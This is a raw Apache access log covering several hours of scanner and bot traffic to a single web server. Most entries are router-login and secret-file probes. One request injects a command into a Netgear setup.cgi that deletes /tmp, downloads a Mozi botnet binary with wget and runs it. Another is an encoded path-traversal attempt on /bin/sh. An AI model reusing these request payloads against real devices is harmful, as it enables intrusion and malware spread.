31.220.1.83 - - [24/Feb/2023:06:47:47 -0500] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
212.87.204.100 - - [24/Feb/2023:06:56:56 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
138.197.152.201 - - [24/Feb/2023:07:02:42 -0500] "GET /aaa9 HTTP/1.1" 404 436 "-" "Mozilla/5.0 zgrab/0.x"
138.197.152.201 - - [24/Feb/2023:07:02:42 -0500] "GET /aab8 HTTP/1.1" 404 436 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [24/Feb/2023:07:07:00 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:07:01 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:07:02 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:08:36 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:08:39 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:08:41 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:08:42 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
212.87.204.100 - - [24/Feb/2023:07:08:56 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.191.219.130 - - [24/Feb/2023:07:12:25 -0500] "GET /robots.txt HTTP/1.1" 404 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
195.191.219.130 - - [24/Feb/2023:07:12:27 -0500] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
190.211.252.122 - - [24/Feb/2023:07:13:11 -0500] "CONNECT pro.ip-api.com:443 HTTP/1.1" 405 505 "-" "-"
178.79.157.239 - - [24/Feb/2023:07:14:39 -0500] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
95.181.161.66 - - [24/Feb/2023:07:17:59 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:07:21:18 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::1 - - [24/Feb/2023:07:22:49 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:22:52 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:28:22 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
183.136.225.32 - - [24/Feb/2023:07:29:30 -0500] "GET / HTTP/1.1" 200 11632 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
212.87.204.100 - - [24/Feb/2023:07:31:04 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
183.136.225.32 - - [24/Feb/2023:07:34:53 -0500] "GET / HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/Feb/2023:07:34:54 -0500] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/Feb/2023:07:34:55 -0500] "GET /robots.txt HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::1 - - [24/Feb/2023:07:39:13 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:39:14 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:39:15 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:39:16 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:39:17 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:39:18 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
3.106.115.45 - - [24/Feb/2023:07:40:43 -0500] "GET /.env HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.106.115.45 - - [24/Feb/2023:07:40:44 -0500] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.106.115.45 - - [24/Feb/2023:07:40:46 -0500] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 492 "-" "python-requests/2.28.2"
212.87.204.100 - - [24/Feb/2023:07:41:38 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::1 - - [24/Feb/2023:07:42:58 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:48:13 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:48:14 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:48:15 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:48:21 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:49:03 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:49:04 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:49:10 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:49:32 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:49:33 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:49:35 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:51:21 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:07:51:22 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
212.87.204.100 - - [24/Feb/2023:07:53:14 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:08:03:33 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
157.230.56.14 - - [24/Feb/2023:08:08:01 -0500] "\x16\x03\x01" 400 0 "-" "-"
157.230.56.14 - - [24/Feb/2023:08:08:01 -0500] "\x16\x03\x01" 400 0 "-" "-"
157.230.56.14 - - [24/Feb/2023:08:08:01 -0500] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
157.230.56.14 - - [24/Feb/2023:08:08:01 -0500] "GET /client/get_targets HTTP/1.1" 404 436 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
212.87.204.100 - - [24/Feb/2023:08:13:06 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.244.50.172 - - [24/Feb/2023:08:15:33 -0500] "GET /config/getuser?index=0 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
212.87.204.100 - - [24/Feb/2023:08:25:47 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:08:34:12 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
181.135.113.59 - - [24/Feb/2023:08:36:09 -0500] "-" 408 0 "-" "-"
212.87.204.100 - - [24/Feb/2023:08:47:28 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.225.74.55 - - [24/Feb/2023:08:49:59 -0500] "POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1" 400 487 "-" "-"
212.87.204.100 - - [24/Feb/2023:08:58:43 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:09:06:53 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::1 - - [24/Feb/2023:09:14:33 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:09:14:34 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:09:14:41 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:09:14:42 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
::1 - - [24/Feb/2023:09:14:47 -0500] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.18 (Ubuntu) OpenSSL/1.0.2g (internal dummy connection)"
179.43.177.242 - - [24/Feb/2023:09:18:58 -0500] "GET / HTTP/1.1" 200 11576 "-" "Hello World"
212.87.204.100 - - [24/Feb/2023:09:19:16 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
177.39.207.20 - - [24/Feb/2023:09:22:39 -0500] "-" 408 0 "-" "-"
172.105.128.11 - - [24/Feb/2023:09:23:07 -0500] "\x16\x03\x01" 400 0 "-" "-"
212.87.204.100 - - [24/Feb/2023:09:28:22 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:09:40:24 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:09:50:02 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
181.39.3.44 - - [24/Feb/2023:09:54:43 -0500] "-" 408 0 "-" "-"
181.39.3.44 - - [24/Feb/2023:09:54:43 -0500] "-" 408 0 "-" "-"
212.87.204.100 - - [24/Feb/2023:10:03:53 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
91.240.118.111 - - [24/Feb/2023:10:03:58 -0500] "GET / HTTP/1.0" 200 11595 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
212.87.204.100 - - [24/Feb/2023:10:13:12 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
35.195.93.98 - - [24/Feb/2023:10:16:24 -0500] "GET / HTTP/1.1" 200 3525 "-" "python-requests/2.28.2"
212.87.204.100 - - [24/Feb/2023:10:23:24 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
91.240.118.111 - - [24/Feb/2023:10:34:31 -0500] "GET / HTTP/1.0" 200 11595 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
212.87.204.100 - - [24/Feb/2023:10:34:40 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:10:44:55 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.62.197.237 - - [24/Feb/2023:10:50:28 -0500] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
64.62.197.241 - - [24/Feb/2023:10:51:30 -0500] "GET /favicon.ico HTTP/1.1" 404 436 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
212.87.204.100 - - [24/Feb/2023:10:57:24 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.138.7.215 - - [24/Feb/2023:11:00:33 -0500] "GET /db.sql HTTP/1.1" 404 492 "-" "python-requests/2.28.2"
212.87.204.100 - - [24/Feb/2023:11:06:02 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:11:18:03 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
222.240.32.226 - - [24/Feb/2023:11:22:52 -0500] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 451 "-" "-"
212.87.204.100 - - [24/Feb/2023:11:29:51 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
186.205.99.57 - - [24/Feb/2023:11:38:17 -0500] "GET / HTTP/1.1" 200 11576 "-" "Hello World"
95.181.161.66 - - [24/Feb/2023:11:39:00 -0500] "GET / HTTP/1.1" 200 3488 "-" "Linux Gnu (cow)"
212.87.204.100 - - [24/Feb/2023:11:39:39 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:11:49:06 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:12:00:56 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:12:11:55 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.244.50.172 - - [24/Feb/2023:12:21:18 -0500] "GET /config/getuser?index=0 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
212.87.204.100 - - [24/Feb/2023:12:23:08 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:12:34:02 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:12:43:35 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:12:55:42 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
180.163.220.126 - - [24/Feb/2023:12:59:46 -0500] "\x16\x03\x01\x01#\x01" 400 0 "-" "-"
180.163.220.110 - - [24/Feb/2023:13:00:24 -0500] "OPTIONS / RTSP/1.0" 400 0 "-" "-"
212.87.204.100 - - [24/Feb/2023:13:07:16 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
3.106.115.45 - - [24/Feb/2023:13:15:17 -0500] "GET /.env HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.106.115.45 - - [24/Feb/2023:13:15:18 -0500] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.106.115.45 - - [24/Feb/2023:13:15:21 -0500] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 492 "-" "python-requests/2.28.2"
212.87.204.100 - - [24/Feb/2023:13:18:18 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:13:27:23 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.246.220.98 - - [24/Feb/2023:13:31:00 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:13:38:09 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:13:50:55 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.87.204.100 - - [24/Feb/2023:13:59:13 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://66.193.215.11:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.235.24.49 - - [24/Feb/2023:14:24:52 -0500] "GET / HTTP/1.1" 200 11576 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
122.58.75.125 - - [24/Feb/2023:14:30:43 -0500] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
180.149.125.166 - - [24/Feb/2023:14:38:09 -0500] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
64.62.197.227 - - [24/Feb/2023:14:38:37 -0500] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
64.62.197.230 - - [24/Feb/2023:14:39:36 -0500] "GET /favicon.ico HTTP/1.1" 404 436 "-" "Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0"
64.62.197.231 - - [24/Feb/2023:14:41:13 -0500] "GET /geoserver/web/ HTTP/1.1" 404 436 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
